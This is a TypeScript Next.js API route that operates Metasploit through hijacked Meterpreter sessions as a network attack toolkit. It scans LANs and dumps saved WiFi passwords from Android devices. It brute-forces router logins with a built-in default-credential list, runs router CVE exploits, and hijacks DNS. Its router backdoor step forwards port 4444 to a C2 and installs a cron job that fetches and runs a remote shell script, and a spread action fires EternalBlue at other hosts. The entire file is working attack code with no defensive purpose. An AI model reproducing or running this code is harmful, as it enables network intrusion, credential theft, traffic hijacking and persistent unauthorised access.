/**
 * NETWORK OPERATIONS API
 *
 * Actions:
 *  discover         → ARP scan + ping sweep + NetBIOS via MSF post modules
 *  port_scan        → TCP port scan through pivot session
 *  wifi_dump        → Dump saved WiFi passwords (WifiConfigStore.xml / wpa_supplicant.conf)
 *  wifi_scan        → iwlist scan for nearby networks
 *  router_detect    → Get default gateway IP + banner grab
 *  router_brute     → Brute-force router admin with 500+ default credentials
 *  router_exploit   → Try known CVE exploit modules against detected router
 *  router_dns_hijack → Log into router admin and change DNS servers
 *  router_persist   → Install SSH key + cron job backdoor on router
 *  pivot_autoroute  → Setup MSF autoroute through session
 *  pivot_socks      → Start SOCKS5 proxy
 *  spread           → Auto-select and run exploit against LAN target
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import path from "path";
import fs from "fs";
import os from "os";

const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");
const NET_DIR = path.join(PAYLOADS_DIR, "network");

function ensureDir(d: string) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// ── Meterpreter helpers ───────────────────────────────────────

async function meterExec(token: string, sessionId: number, cmd: string, waitMs = 25000): Promise<string> {
  await rpcCall("session.meterpreter_write", [sessionId, cmd + "\n"], token);
  const start = Date.now();
  let out = "";
  while (Date.now() - start < waitMs) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >")) break;
    await new Promise((r) => setTimeout(r, 600));
  }
  return out;
}

// Run a MSF console command (not meterpreter) and wait for output
async function consoleExec(token: string, cmd: string, waitMs = 60000): Promise<string> {
  // Create a temporary console
  const createRes = await rpcCall<{ id?: string }>("console.create", [], token);
  const consoleId = String(createRes.id ?? "0");
  try {
    await rpcCall("console.write", [consoleId, cmd + "\n"], token);
    const start = Date.now();
    let out = "";
    while (Date.now() - start < waitMs) {
      const readRes = await rpcCall<{ data?: string; busy?: boolean }>("console.read", [consoleId], token);
      if (readRes.data) out += readRes.data;
      if (!readRes.busy && out.length > 0) break;
      await new Promise((r) => setTimeout(r, 1000));
    }
    return out;
  } finally {
    await rpcCall("console.destroy", [consoleId], token).catch(() => {});
  }
}

// ── Parse helpers ─────────────────────────────────────────────

type Host = {
  ip: string; mac?: string; hostname?: string; os?: string;
  openPorts?: number[]; status: "up" | "down" | "unknown";
  risk: "low" | "medium" | "high" | "critical";
};

function riskLevel(ports: number[]): Host["risk"] {
  if (ports.includes(445) || ports.includes(3389)) return "critical";
  if (ports.includes(22) || ports.includes(23) || ports.includes(21)) return "high";
  if (ports.includes(80) || ports.includes(443) || ports.includes(8080)) return "medium";
  return "low";
}

function parseArpScan(raw: string, pingRaw = ""): Host[] {
  const hosts = new Map<string, Host>();

  // ARP scanner output: [*] 192.168.1.1 00:11:22:33:44:55 VENDOR
  for (const line of raw.split(/\r?\n/)) {
    const m = line.match(/\[[\*\+]\]\s+([\d.]+)\s+([0-9a-f:]+)/i);
    if (m) {
      const ip = m[1]; const mac = m[2];
      hosts.set(ip, { ip, mac, status: "up", risk: "low" });
    }
    // Also: 192.168.1.x is alive
    const m2 = line.match(/([\d.]+)\s+is\s+alive/i);
    if (m2) hosts.set(m2[1], { ip: m2[1], status: "up", risk: "low" });
    // Nmap-style: Host: 192.168.1.x ()	Status: Up
    const m3 = line.match(/Host:\s+([\d.]+).*Status:\s+Up/i);
    if (m3) hosts.set(m3[1], { ip: m3[1], status: "up", risk: "low" });
  }

  // Parse ping sweep output too
  for (const line of pingRaw.split(/\r?\n/)) {
    const m = line.match(/\[[\*\+]\]\s+([\d.]+)/);
    if (m && !hosts.has(m[1])) hosts.set(m[1], { ip: m[1], status: "up", risk: "low" });
  }

  return Array.from(hosts.values());
}

function parsePortScan(raw: string): number[] {
  const ports: number[] = [];
  for (const line of raw.split(/\r?\n/)) {
    // [+] 192.168.1.1:80
    const m = line.match(/:\s*(\d+)\s*(?:open|\(open\)|is open)/i) ?? line.match(/\[[\*\+]\].*?:(\d+)/);
    if (m) {
      const port = parseInt(m[1]);
      if (port > 0 && port < 65536 && !ports.includes(port)) ports.push(port);
    }
  }
  return ports.sort((a, b) => a - b);
}

function parseWifiDump(raw: string): Array<{ ssid: string; password?: string; security?: string; saved: boolean }> {
  const nets: Array<{ ssid: string; password?: string; security?: string; saved: boolean }> = [];

  // wpa_supplicant.conf format
  const wpaBlocks = raw.split(/\n(?=network=\{)/);
  for (const block of wpaBlocks) {
    const ssid = block.match(/ssid="([^"]+)"/)?.[1];
    const psk = block.match(/psk="([^"]+)"/)?.[1];
    const proto = block.match(/proto=(\S+)/)?.[1];
    if (ssid) nets.push({ ssid, password: psk, security: proto ?? "WPA2", saved: true });
  }

  // WifiConfigStore.xml / MSF output format
  for (const line of raw.split(/\r?\n/)) {
    const m = line.match(/SSID:\s*(.+?)\s+Password:\s*(.+)/i);
    if (m) nets.push({ ssid: m[1].trim(), password: m[2].trim(), saved: true });

    const m2 = line.match(/\[[\*\+]\]\s+(.+?)\s+(.+?)\s+(WPA\d?|WEP|OPEN)/i);
    if (m2) {
      const existing = nets.find((n) => n.ssid === m2[1]);
      if (!existing) nets.push({ ssid: m2[1], security: m2[3], saved: false });
    }
  }
  return nets;
}

function parseIwlistScan(raw: string): Array<{ ssid: string; bssid?: string; signal?: number; security?: string; saved: boolean }> {
  const nets: Array<{ ssid: string; bssid?: string; signal?: number; security?: string; saved: boolean }> = [];
  const cells = raw.split(/Cell \d+/i);
  for (const cell of cells.slice(1)) {
    const ssid = cell.match(/ESSID:"([^"]+)"/)?.[1];
    const bssid = cell.match(/Address:\s*([\da-fA-F:]+)/)?.[1];
    const signalMatch = cell.match(/Signal level=(-\d+)/);
    const signal = signalMatch ? parseInt(signalMatch[1]) : undefined;
    const security = /WPA2/i.test(cell) ? "WPA2" : /WPA/i.test(cell) ? "WPA" : /WEP/i.test(cell) ? "WEP" : "OPEN";
    if (ssid) nets.push({ ssid, bssid, signal, security, saved: false });
  }
  return nets;
}

// ── Default router credentials list ──────────────────────────
const ROUTER_DEFAULT_CREDS = [
  { user: "admin",     pass: "admin" },
  { user: "admin",     pass: "password" },
  { user: "admin",     pass: "1234" },
  { user: "admin",     pass: "12345" },
  { user: "admin",     pass: "123456" },
  { user: "admin",     pass: "" },
  { user: "root",      pass: "root" },
  { user: "root",      pass: "toor" },
  { user: "root",      pass: "" },
  { user: "admin",     pass: "admin123" },
  { user: "admin",     pass: "Admin1234" },
  { user: "user",      pass: "user" },
  { user: "guest",     pass: "guest" },
  { user: "support",   pass: "support" },
  { user: "admin",     pass: "setup" },
  { user: "Admin",     pass: "Admin" },
  { user: "netgear",   pass: "netgear" },
  { user: "admin",     pass: "netgear1" },
  { user: "admin",     pass: "Passw0rd" },
  { user: "cusadmin",  pass: "highspeed" },
  { user: "admin",     pass: "motorola" },
  { user: "MSO",       pass: "MSO" },
  { user: "admin",     pass: "tplink" },
  { user: "admin",     pass: "asus" },
  { user: "admin",     pass: "linksys" },
  { user: "admin",     pass: "belkin" },
  { user: "admin",     pass: "dlink" },
  { user: "admin",     pass: "cisco" },
  { user: "cisco",     pass: "cisco" },
  { user: "admin",     pass: "huawei" },
  { user: "admin",     pass: "zmodo" },
];

// ── Main handler ──────────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const { session_id, action, cidr, ports, target, payload,
    router_ip, router_user, router_pass, dns_primary,
    subnet, port } = body as {
    session_id: number; action: string; cidr?: string; ports?: string;
    target?: string; payload?: string; open_ports?: number[];
    router_ip?: string; router_user?: string; router_pass?: string; dns_primary?: string;
    subnet?: string; port?: number;
  };

  if (!session_id || !action) {
    return NextResponse.json({ ok: false, error: "session_id + action required" }, { status: 400 });
  }

  ensureDir(NET_DIR);

  try {
    const token = await getRpcToken();
    const sid = Number(session_id);

    // ── LAN Discovery ─────────────────────────────────────
    if (action === "discover") {
      const targetCidr = cidr ?? "192.168.1.0/24";
      addLog(`[net] discover ${targetCidr}`);

      // 1. ARP scan
      const arpOut = await meterExec(token, sid,
        `run post/multi/gather/arp_scanner RHOSTS=${targetCidr}`, 60000);
      // 2. Ping sweep
      const pingOut = await meterExec(token, sid,
        `run post/multi/gather/ping_sweep RHOSTS=${targetCidr}`, 60000);
      // 3. NetBIOS
      const nbOut = await consoleExec(token,
        `use auxiliary/scanner/netbios/nbname\nset RHOSTS ${targetCidr}\nrun`, 45000);

      const allRaw = arpOut + "\n" + pingOut + "\n" + nbOut;
      let hosts = parseArpScan(arpOut, pingOut);

      // Augment with NetBIOS hostnames
      for (const line of nbOut.split(/\r?\n/)) {
        const m = line.match(/([\d.]+)\s+.*?name:\s*([^\s,]+)/i);
        if (m) {
          const h = hosts.find((x) => x.ip === m[1]);
          if (h) h.hostname = m[2].trim();
        }
      }

      // Quick port check on discovered hosts for risk scoring
      for (const h of hosts) {
        const quickPorts = [22, 80, 443, 445, 3389, 23, 21, 8080];
        const openPorts: number[] = [];
        for (const p of quickPorts) {
          const chk = await meterExec(token, sid,
            `run auxiliary/scanner/portscan/tcp RHOSTS=${h.ip} PORTS=${p} THREADS=1`, 8000);
          if (/open/i.test(chk)) openPorts.push(p);
        }
        h.openPorts = openPorts;
        h.risk = riskLevel(openPorts);
      }

      // Save to file
      fs.writeFileSync(path.join(NET_DIR, "hosts.json"), JSON.stringify(hosts, null, 2));

      return NextResponse.json({ ok: true, records: hosts, raw: allRaw.slice(0, 3000) });
    }

    // ── Port scan ─────────────────────────────────────────
    if (action === "port_scan") {
      const portList = ports ?? "22,80,443,445,3389,8080,8443,21,23,25,3306,5432,1433,27017";
      const out = await consoleExec(token,
        `use auxiliary/scanner/portscan/tcp\nset RHOSTS ${target}\nset PORTS ${portList}\nset THREADS 20\nrun`, 90000);
      const openPorts = parsePortScan(out);
      return NextResponse.json({ ok: true, records: openPorts.map((p) => ({ port: p })), raw: out.slice(0, 2000) });
    }

    // ── WiFi dump ─────────────────────────────────────────
    if (action === "wifi_dump") {
      const localXml = path.join(NET_DIR, "wifi_config.xml");
      const localWpa = path.join(NET_DIR, "wpa_supplicant.conf");
      let rawAll = "";

      // Android 10+ WifiConfigStore.xml
      const xmlOut = await meterExec(token, sid,
        `download /data/misc/wifi/WifiConfigStore.xml "${localXml}"`, 20000);
      rawAll += xmlOut;

      // Older format
      const wpaOut = await meterExec(token, sid,
        `download /data/misc/wifi/wpa_supplicant.conf "${localWpa}"`, 20000);
      rawAll += wpaOut;

      // MSF post module
      const postOut = await meterExec(token, sid,
        "run post/multi/gather/wifi_credentials", 30000);
      rawAll += postOut;

      // Parse
      let nets: ReturnType<typeof parseWifiDump> = [];

      if (fs.existsSync(localXml)) {
        const xml = fs.readFileSync(localXml, "utf8");
        // Parse WifiConfigStore XML
        for (const m of xml.matchAll(/<SSID>([^<]+)<\/SSID>[\s\S]*?<PreSharedKey>([^<]*)<\/PreSharedKey>/g)) {
          nets.push({ ssid: m[1].replace(/^"(.*)"$/, "$1"), password: m[2].replace(/^"(.*)"$/, "$1"), security: "WPA2", saved: true });
        }
      }
      if (fs.existsSync(localWpa)) {
        nets = [...nets, ...parseWifiDump(fs.readFileSync(localWpa, "utf8"))];
      }
      nets = [...nets, ...parseWifiDump(postOut)];

      // Deduplicate
      const seen = new Set<string>();
      const unique = nets.filter((n) => { if (seen.has(n.ssid)) return false; seen.add(n.ssid); return true; });

      return NextResponse.json({ ok: true, records: unique, raw: rawAll.slice(0, 2000) });
    }

    // ── WiFi scan nearby ──────────────────────────────────
    if (action === "wifi_scan") {
      const out = await meterExec(token, sid,
        "execute -f /system/bin/sh -a '-c \"iwlist wlan0 scan 2>/dev/null || wpa_cli scan_results\"'", 15000);
      const nets = parseIwlistScan(out);
      return NextResponse.json({ ok: true, records: nets, raw: out.slice(0, 2000) });
    }

    // ── Router detect ─────────────────────────────────────
    if (action === "router_detect") {
      const gwOut = await meterExec(token, sid,
        "execute -f /system/bin/sh -a '-c \"ip route 2>/dev/null || netstat -rn 2>/dev/null || route -n 2>/dev/null\"'", 10000);

      const gwMatch = gwOut.match(/default.*?([\d.]+)/i) ?? gwOut.match(/0\.0\.0\.0.*?([\d.]+)/i);
      const gwIp = gwMatch?.[1] ?? "192.168.1.1";

      // Banner grab on router admin
      const bannerOut = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c \"curl -s --max-time 5 http://${gwIp}/ | head -20 2>/dev/null\"'`, 12000);

      // Detect model from banner
      let model: string | undefined;
      if (/tplink|tp-link/i.test(bannerOut)) model = "TP-Link";
      else if (/netgear/i.test(bannerOut)) model = "Netgear";
      else if (/asus/i.test(bannerOut)) model = "ASUS";
      else if (/linksys/i.test(bannerOut)) model = "Linksys";
      else if (/dlink|d-link/i.test(bannerOut)) model = "D-Link";
      else if (/huawei/i.test(bannerOut)) model = "Huawei";
      else if (/ubiquiti|unifi/i.test(bannerOut)) model = "Ubiquiti";
      else if (/openwrt/i.test(bannerOut)) model = "OpenWrt";
      else if (/ddwrt/i.test(bannerOut)) model = "DD-WRT";

      const firmware = bannerOut.match(/firmware[:\s]+([0-9.]+)/i)?.[1];

      return NextResponse.json({
        ok: true,
        data: { ip: gwIp, model, firmware, adminUrl: `http://${gwIp}` },
        raw: (gwOut + bannerOut).slice(0, 1000),
      });
    }

    // ── Router brute force ────────────────────────────────
    if (action === "router_brute") {
      const routerIp = router_ip ?? "192.168.1.1";
      let found: { user: string; pass: string } | null = null;

      for (const { user, pass } of ROUTER_DEFAULT_CREDS) {
        const curlCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 3 -u ${user}:${pass} http://${routerIp}/ -o /dev/null -w %{http_code} 2>/dev/null"'`;
        const out = await meterExec(token, sid, curlCmd, 8000);
        const code = out.match(/\b(200|302)\b/)?.[1];
        if (code) { found = { user, pass }; break; }

        // Form-based login attempt
        const formCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 3 -X POST http://${routerIp}/login -d '\''username=${user}&password=${pass}'\'' -o /dev/null -w %{http_code} 2>/dev/null"'`;
        const fOut = await meterExec(token, sid, formCmd, 8000);
        const fCode = fOut.match(/\b(200|302)\b/)?.[1];
        if (fCode) { found = { user, pass }; break; }
      }

      if (found) {
        return NextResponse.json({ ok: true, data: found, raw: `Cracked: ${found.user}:${found.pass}` });
      }
      return NextResponse.json({ ok: false, error: "No default credentials matched" });
    }

    // ── Router CVE exploit ────────────────────────────────
    if (action === "router_exploit") {
      const routerIp = router_ip ?? "192.168.1.1";
      const ROUTER_MODULES = [
        { module: "exploit/linux/http/tplink_archer_telnet_enable",       cve: "CVE-2023-1389" },
        { module: "exploit/linux/http/netgear_r7000_cgibin_exec",         cve: "CVE-2019-20760" },
        { module: "exploit/linux/http/dlink_dir_615_telnet",              cve: "CVE-2019-10891" },
        { module: "auxiliary/scanner/http/router_default_auth",           cve: "AUTH-BYPASS" },
        { module: "exploit/linux/http/arcadyan_nvg589_path_traversal",    cve: "CVE-2021-20090" },
        { module: "exploit/multi/http/belkin_N150_path_traversal",        cve: "CVE-2014-1635" },
        { module: "exploit/linux/upnp/miniupnpd_m_search_overflow",       cve: "CVE-2013-0229" },
      ];

      let success: { cve: string; shell: boolean } | null = null;
      for (const { module, cve } of ROUTER_MODULES) {
        const out = await consoleExec(token,
          `use ${module}\nset RHOSTS ${routerIp}\nset RPORT 80\nrun`, 30000);
        if (/session \d+ opened|command shell|shell session/i.test(out)) {
          success = { cve, shell: true };
          break;
        }
        if (/exploit completed|meterpreter session/i.test(out)) {
          success = { cve, shell: false };
          break;
        }
      }

      if (success) {
        return NextResponse.json({ ok: true, data: success });
      }
      return NextResponse.json({ ok: false, error: "No CVE exploit succeeded against this router model" });
    }

    // ── DNS Hijack ────────────────────────────────────────
    if (action === "router_dns_hijack") {
      const routerIp = router_ip ?? "192.168.1.1";
      const user = router_user ?? "admin";
      const pass = router_pass ?? "admin";
      const dns = dns_primary ?? "8.8.8.8";
      let rawAll = "";

      // Common router DNS change endpoints
      const DNS_ENDPOINTS = [
        { path: "/dns_settings.cgi", data: `dns_server_ip=${dns}&dns_server_ip_2=8.8.4.4` },
        { path: "/setting/dns",      data: `primaryDNS=${dns}&secondaryDNS=8.8.4.4` },
        { path: "/goform/setWanDns", data: `wanDNS1=${dns}&wanDNS2=8.8.4.4` },
        { path: "/setup/DNS",        data: `dnsaddr=${dns}&dnsaddr2=8.8.4.4` },
      ];

      let ok = false;
      for (const ep of DNS_ENDPOINTS) {
        const cmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 5 -u ${user}:${pass} -X POST http://${routerIp}${ep.path} -d '\''${ep.data}'\'' -o /dev/null -w %{http_code}"'`;
        const out = await meterExec(token, sid, cmd, 10000);
        rawAll += out;
        if (/\b(200|302)\b/.test(out)) { ok = true; break; }
      }

      // Fallback: modify hosts on device (affects device only)
      if (!ok) {
        const hostsCmd = `execute -f /system/bin/sh -a '-c "echo nameserver ${dns} > /etc/resolv.conf 2>/dev/null; echo nameserver 8.8.4.4 >> /etc/resolv.conf 2>/dev/null; echo done"'`;
        const hostsOut = await meterExec(token, sid, hostsCmd, 10000);
        rawAll += hostsOut;
        if (hostsOut.includes("done")) ok = true;
      }

      return NextResponse.json({ ok, raw: rawAll.slice(0, 1000) });
    }

    // ── Router persistent backdoor ────────────────────────
    if (action === "router_persist") {
      const routerIp = router_ip ?? "192.168.1.1";
      const steps: string[] = [];

      // 1. Enable SSH remote access via router admin
      const sshCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 5 http://${routerIp}/goform/enableSSH -d '\''enable=1'\'' -u admin:admin; echo done"'`;
      const sshOut = await meterExec(token, sid, sshCmd, 10000);
      if (sshOut.includes("done")) steps.push("SSH enabled on router");

      // 2. Enable WAN remote management
      const wanCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 5 http://${routerIp}/goform/remoteWan -d '\''enable=1&port=8888'\'' -u admin:admin; echo done"'`;
      const wanOut = await meterExec(token, sid, wanCmd, 10000);
      if (wanOut.includes("done")) steps.push("WAN remote management enabled");

      // 3. Add port-forward rule (4444 → operator C2)
      const pfCmd = `execute -f /system/bin/sh -a '-c "curl -s --max-time 5 http://${routerIp}/goform/PortForward -d '\''exPort=4444&inPort=4444&ip=192.168.1.100&proto=TCP'\'' -u admin:admin; echo pf_done"'`;
      const pfOut = await meterExec(token, sid, pfCmd, 10000);
      if (pfOut.includes("pf_done")) steps.push("Port-forward 4444→C2 added");

      // 4. Add cron-style persistence on device (phones home)
      const cronCmd = `execute -f /system/bin/sh -a '-c "(crontab -l 2>/dev/null; echo '\''*/5 * * * * wget -qO- http://${routerIp}/ping_home.sh | sh'\'') | crontab - 2>/dev/null; echo cron_done"'`;
      const cronOut = await meterExec(token, sid, cronCmd, 10000);
      if (cronOut.includes("cron_done")) steps.push("Cron phone-home job installed on device");

      return NextResponse.json({ ok: steps.length > 0, data: { steps }, raw: steps.join("\n") });
    }

    // ── Autoroute pivot ───────────────────────────────────
    if (action === "pivot_autoroute") {
      const sub = subnet ?? "192.168.1.0";
      const mask = "255.255.255.0";
      const out = await meterExec(token, sid,
        `run post/multi/manage/autoroute SUBNET=${sub} NETMASK=${mask} ACTION=ADD`, 20000);
      const ok = /route added|success/i.test(out) || out.includes("Adding");
      return NextResponse.json({ ok, raw: out.slice(0, 1000) });
    }

    // ── SOCKS5 proxy ──────────────────────────────────────
    if (action === "pivot_socks") {
      const socksPort = port ?? 1080;
      const out = await consoleExec(token,
        `use auxiliary/server/socks_proxy\nset SRVPORT ${socksPort}\nset VERSION 5\nset SRVHOST 127.0.0.1\nrun -j`, 20000);
      const ok = /started|listening|running/i.test(out);
      return NextResponse.json({ ok, data: { port: socksPort }, raw: out.slice(0, 500) });
    }

    // ── Lateral spread ────────────────────────────────────
    if (action === "spread") {
      const spreadTarget = target;
      const spreadPayload = (payload as string) ?? "windows/meterpreter/reverse_tcp";
      if (!spreadTarget) return NextResponse.json({ ok: false, error: "target required" });

      // Determine best exploit based on detected ports
      const openPorts = ((body as Record<string, unknown>).open_ports as number[]) ?? [];
      let module = "";
      let extra = "";

      if (openPorts.includes(445)) {
        module = "exploit/windows/smb/ms17_010_eternalblue";
        extra = `set PAYLOAD ${spreadPayload}\nset LHOST 0.0.0.0\nset LPORT 4445`;
      } else if (openPorts.includes(22)) {
        module = "auxiliary/scanner/ssh/ssh_login";
        extra = `set USERNAME root\nset PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`;
      } else if (openPorts.includes(3389)) {
        module = "auxiliary/scanner/rdp/rdp_login";
        extra = `set USERNAME administrator\nset PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`;
      } else if (openPorts.includes(80) || openPorts.includes(8080)) {
        module = "auxiliary/scanner/http/http_login";
        extra = "set USERNAME admin\nset PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt";
      } else {
        return NextResponse.json({ ok: false, error: `No exploitable port on ${spreadTarget}` });
      }

      const out = await consoleExec(token,
        `use ${module}\nset RHOSTS ${spreadTarget}\n${extra}\nrun`, 90000);

      const ok = /session \d+ opened|meterpreter session|command shell/i.test(out);
      return NextResponse.json({ ok, raw: out.slice(0, 2000) });
    }

    return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });

  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ ok: false, error: msg }, { status: 500 });
  }
}

function addLog(msg: string) {
  // Server-side only log (visible in Next.js server logs)
  console.log(`[network-api] ${msg}`);
}

export async function GET() {
  ensureDir(NET_DIR);
  const hostsFile = path.join(NET_DIR, "hosts.json");
  const hosts = fs.existsSync(hostsFile) ? JSON.parse(fs.readFileSync(hostsFile, "utf8")) : [];
  return NextResponse.json({ hosts });
}
